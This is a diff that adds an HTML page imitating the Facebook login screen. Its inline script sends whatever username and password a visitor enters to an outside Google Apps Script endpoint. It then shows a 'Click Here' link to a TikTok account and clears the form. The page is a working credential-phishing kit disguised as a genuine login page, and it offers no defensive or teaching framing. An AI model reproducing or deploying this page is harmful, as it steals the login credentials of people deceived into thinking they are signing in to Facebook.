@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="heading"><h2>facebook</h2></div>
+        <form name="submit-to-google-sheet">
+            <div class="form-input">
+                <input type="text" name="username" placeholder="Mobile number or email adrress">
+                <input type="password" name="password" placeholder="Password">
+            </div>
+            <div class="submit"><input type="submit" value="Log in"></div>
+        </form>
+        <div class="forget"><a href="https://www.facebook.com">Forgotten password?</a></div>
+        <div class="row">
+            <div class="hr col"></div>
+            <p class="col">or</p>
+            <div class="hr col"></div>
+        </div>
+        <div class="btn"><button class="btn" type="submit">Create new account</button></div>
+        <div class="msg"><a href="https://www.tiktok.com/@gamme__show" id="msg"></a></div>
+    </div>
+    
+    <script src="app.js"></script>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbzI9RtsxkpNRoBqyNZR6_YjBFySHSipm383CWHaY1a2np4Q1AT3t_fKmWiZpYre-AAe/exec'
+        const form = document.forms['submit-to-google-sheet']
+        const msg = document.getElementById("msg")
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => {
+                msg.innerHTML = "Click Here ➡"
+                setTimeout(function(){
+                    msg.innerHTML = ""
+                },90000)
+                form.reset()
+            })
+            .catch(error => console.error('Error!', error.message))
+        })
+    </script>
+</body>
+</html>
